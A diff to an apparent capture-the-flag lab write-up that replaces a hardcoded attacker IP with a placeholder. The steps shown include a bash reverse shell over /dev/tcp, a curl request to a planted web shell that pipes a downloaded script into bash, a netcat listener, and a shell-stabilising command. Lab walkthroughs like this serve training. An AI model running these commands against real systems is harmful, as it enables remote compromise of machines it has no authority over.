@@ -55,7 +55,7 @@ Command used: `curl 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%
 
 - Create a `shellscript.sh` file with the following code:
 	`#!/bin/bash`
-	`bash -i >& /dev/tcp/10.50.74.165/53 0>&1`
+	`bash -i >& /dev/tcp/<tun0 IP>/53 0>&1`
 
 - Start up a local web server in the `shellscript.sh` directory on your attacking machine.
 	`python3 -m http.server 80`
@@ -64,7 +64,7 @@ Command used: `curl 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%
 	`nc -lvnp 53`
 
 - On the Reverse Shell you already have opened, run the following code:
-	`curl 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F10.50.74.165%3A80%2Fshellscript.sh%7Cbash%20%26'`
+	`curl 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F<tun0 IP>%3A80%2Fshellscript.sh%7Cbash%20%26'`
 	![[Task 19 - Going out with a SHEBANG!-20240919140944870.webp]]
 - Stabilize the shell.
 	`python3 -c 'import pty; pty.spawn("/bin/bash")'`
